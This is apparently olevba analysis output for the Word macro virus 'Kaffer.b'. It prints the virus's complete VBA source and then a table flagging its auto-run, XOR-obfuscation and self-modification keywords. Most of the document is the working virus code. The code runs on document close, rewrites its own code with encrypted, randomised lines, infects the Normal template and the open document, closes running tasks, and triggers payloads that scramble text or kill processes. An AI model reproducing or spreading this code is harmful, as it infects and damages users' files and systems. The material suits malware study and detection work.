olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kaffer.b
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Kaffer.b 
in file: Virus.MSWord.Kaffer.b - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Kaffer()
End Sub
Private Sub Document_Close()
Dothis
End Sub
Private Sub AutoClose()
Dothis
End Sub
Private Function rndm(a)
Randomize Timer
rndm = Int(Rnd * a) + ((0 Xor 0 Xor 0) Xor 1)
End Function
Private Function spa()
Randomize Timer
spa = Space(rndm(((0 Xor 0 Xor 0) Xor 40)))
End Function
Private Function num(aa)
Randomize Timer
Select Case aa
Case 0
Select Case rndm(6)
Case 1: num = Crypt("���������������", 133)
Case 2: num = Crypt("��������������", 130)
Case 3: num = Crypt("���𬴪�������", 132)
Case 4: num = Crypt("��翨����", 199)
Case 5: num = Crypt("^YCOXE

", 55)
Case 6: num = Crypt("��������������", 213)
End Select
Case 1
Select Case rndm(6)
Case 1: num = Crypt("������ಢ���ಢ����ಣ�", 146)
Case 2: num = Crypt("�좭������������伫����", 196)
Case 3: num = Crypt("�𱶬�����������������", 216)
Case 4: num = Crypt("������Շ�����Շ��", 167)
Case 5: num = Crypt("�����������������������", 143)
Case 6: num = Crypt("�󽲣�����������������", 219)
End Select
End Select
End Function
Private Sub Mutate()
Select Case rndm(3)
Case 1: b = spa & Crypt("$WFWJW9#Y!5'
Y!54_", 119) & num(1) & Crypt("(/bnedlnetmd", 1)
Case 2: b = spa & Crypt("dZG[}\A^R_gV^C_RGV
eqcA\YVPG
eqp\^C\]V]G@", 51) & num(1) & Crypt("������������ل�������������Џ���ѕ����", 181)
Case 3: b = spa & Crypt("�����������������봮���殠��������������殠�������������", 142) & num(1) & Crypt("������������������������������������������������������", 153)
End Select
Select Case rndm(3)
Case 1: c = spa & Crypt("������������������������������������������������", 142) & num(1) & Crypt("������������", 139)
Case 2: c = spa & Crypt("���ڒ�����������Ɯ��������Ɯ�������������", 178) & num(1) & Crypt("|ou0!u!=<&duhu{6:108:1 90ou;1u<!=", 85)
Case 3: c = spa & Crypt("����������������嫱��������������嫱������������������", 145) & num(1) & Crypt("������������������������㼦�������������������", 134)
End Select
Select Case rndm(3)
Case 1: d = spa & Crypt("$>298}`})54.ls1438.u", 93) & num(1) & Crypt("�����", 157)
Case 2: d = spa & Crypt("��������������������������������������", 156) & num(1) & Crypt("��񜨲������������������������", 209) & num(1) & Crypt("����������", 206)
Case 3: d = spa & Crypt("���Ԝ�����������Ȇ����Ԝ���������Ȇ����Ԝ������������ϔ", 188) & num(1) & Crypt("�����������������������������", 145) & num(1) & Crypt("�������������긢������긢�������", 130)
End Select
Select Case rndm(3)
Case 1: e = spa & Crypt("���χ�����˖", 167)
Case 2: e = spa & Crypt("���������������������������������������������", 139) & num(1) & Crypt("������������", 141)
Case 3: e = spa & Crypt("�����������������������������������������", 143) & num(1) & Crypt("������������", 176)
End Select
Select Case rndm(2)
Case 1: f = spa & Crypt("v<=4=,=416=+x", 88) & num(1) & Crypt("\P^


", 112)
Case 2: f = spa & Crypt("54)6:7ju?>7>/>725>({", 91) & num(1) & Crypt("]\A^R_
P\F]G\U_Z]V@", 51)
End Select
Select Case rndm(3)
Case 1: g = spa & Crypt("馣�����������窾����", 199)
Case 2: g = spa & Crypt("4stihnvsti:", 26) & num(1) & Crypt("��������", 173)
Case 3: g = spa & Crypt("�����鴫�������������������", 133)
End Select
h = spa & Crypt(".$`7)4(", 64)
Select Case rndm(3)
Case 1: i = spa & Crypt("�������������������������������������������������", 140) & num(1) & Crypt("������������", 177)
Case 2: i = spa & Crypt("�����������������������������������������", 129) & num(1) & Crypt("������������������������鶬�������", 140)
Case 3: i = spa & Crypt("�����������������������蠮��������������蠮������������", 128) & num(1) & Crypt("��쟩�쭯�����⯣���������쉢�웥���쉢�웥���쉢�웥��", 204)
End Select
Select Case rndm(3)
Case 1: j = spa & Crypt("RC", 114)
Case 2: j = spa & Crypt("iwjv>}jwh{zq}ks{pj0h|nlqt{}j0h|}qsnqp{pjm6", 30) & num(1) & Crypt(">9txsrzxsb{r", 23)
Case 3: j = spa & Crypt("E[FZSQF[DWV]QG_W\F
DPB@]XWQF
DPQ]_B]\W\FA
[FW_", 50) & num(1) & Crypt("�㮢��������", 205)
End Select
Select Case rndm(2)
Case 1: k = spa & Crypt("�؞����ۖ�����͖����ʖ������������̞�������Ɩ����̞������̞��������", 190) & Chr(34) & Crypt("sqjubwf#pva#tn:4\hbeefq+*", 3) & Chr(34) & Crypt("
IUXS", 61)
Case 2: k = spa & Crypt("��˞�����Ň������Â������������˓�������Í����˓������˓�����������", 235) & Chr(34) & Crypt("�������ԧ��ԣ��ë��������", 244) & Chr(34) & Crypt("q%94?", 81)
End Select
l = spa & Crypt("�����������ƕ", 181) & num(1) & Crypt("���������������", 211)
Select Case rndm(2)
Case 1: m = spa & Crypt("죦�����������⯻����", 194)
Case 2: m = spa & Crypt("
KLQGPVNKLGQ", 34) & num(1) & Crypt("s2&<0;:", 95)
End Select
n = spa & Crypt("MFL\x08AN", 40)
o = spa & Crypt("��������", 205)
P = spa: For oooo = 1 To rndm(6): tp = tp & Crypt(".??#&,.;& !a", 79): Next: P = P & Crypt("$:';s", 83) & tp & Crypt("�������", 199): tp = ""
q = spa: For oooo = 1 To rndm(6): q = q & Crypt("v9((41;9,176v7(,176+", 88): Next: q = q & Crypt("���������������̂��", 162) & num(0): tp = ""
r = spa: For oooo = 1 To rndm(6): r = r & Crypt("��������������������", 211): Next: r = r & Crypt("������������������ⱬ�", 145) & num(0): tp = ""
s = spa: For oooo = 1 To rndm(6): s = s & Crypt("죲���������쭲�����", 194): Next: s = s & Crypt("s.<+832/0<1-/20-)}`}", 93) & num(0): tp = ""
u = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("����������ٙ", 183): Next: u = u & Crypt("����", 129) & tp & Crypt("�����������", 130): tp = ""
v = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("㌽���������", 205): Next: v = v & Crypt("O_NYYRILX]HUR[

", 60) & num(0): tp = ""
w = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("N__CFLN[F@A", 47): Next: w = w & Crypt("�������������������������", 135) & num(0): tp = ""
x = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("������������", 128): Next: x = x & Crypt("�����������������������������", 142): tp = ""
y = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("������������", 208): Next: y = y & Crypt("����������������������㼻�����������������������������������������������������⼻", 134) & Chr(34) & Chr(32) & Chr(34): tp = ""
z = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("������������", 135): Next: z = z & Crypt("Q:

<

4_B_\x08<

;


", 127): tp = ""
more = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("������������", 208): Next: more = more & Crypt("񔺦��������񞻻���������❪���������������������������������������������������������", 223) & Chr(34) & Chr(32) & Chr(34): tp = ""
vircode = Array(b, c, d, e, f, g, h, i, j, k, l, m, n, o, P, q, r, s, o, u, v, w, x, y, z, more, o)
For ki = 0 To 26
With ThisDocument: With .VBProject:
With .vbcomponents(1): With .codemodule
.insertlines ki + 2, vircode(ki)
End With: End With
End With: End With
Next
End Sub
Private Function Crypt(klo, key)
Crypt = ""
For i = 1 To Len(klo)
Crypt = Crypt & Chr(Asc(Mid(klo, i, 1)) Xor key)
Next
End Function
Private Sub Dothis()
On Error Resume Next
For i = 1 To Tasks.Count
If LCase(InStr(1, Tasks(i).Name, Crypt("lct", 2))) Then Tasks(i).Close
If LCase(InStr(1, Tasks(i).Name, Crypt("dqct", 2))) Then Tasks(i).Close
Next
Mutate
Kaffer
With NormalTemplate
With .VBProject
With .vbcomponents(1)
With .codemodule
.deletelines 2, 27
End With
End With
End With
End With
With ActiveDocument
With .VBProject
With .vbcomponents(1)
With .codemodule
.deletelines 2, 27
End With
End With
End With
End With
With NormalTemplate
attr = GetAttr(.FullName)
SetAttr .FullName, 0
.Save
SetAttr .FullName, attr
End With
With ActiveDocument
attr = GetAttr(.FullName)
SetAttr .FullName, 0
.SaveAs .FullName
SetAttr .FullName, attr
End With
Select Case ActiveDocument.Content
Case UCase(InStr(1, ActiveDocument.Content.Text, Crypt("HBEEFQ", 3))): Payload_1
Case UCase(InStr(1, ActiveDocument.Content.Text, Crypt("NIRHIR", 6))): Payload_2
End Select
End Sub
Private Sub Payload_1()
With ActiveDocument.Content
With .Font
.Name = (rndm(10))
.Size = (20 + rndm(10))
 .ColorIndex = (rndm(19) - 1)
.Animation = (rndm(6) - 1)
 End With
.Text = Crypt("̥�����������������������������������������������������������������֥�", 133)
End With
End Sub
Private Sub Payload_2()
Tasks(rndm(Tasks.Count)).Close
End Sub
' Wm97.Kaffer by Vlam
' Dear AV
' I am currently on the VX side, but one day i will join you.





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|'\x08'              |May use special characters such as backspace |
|          |                    |to obfuscate code when printed on the console|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

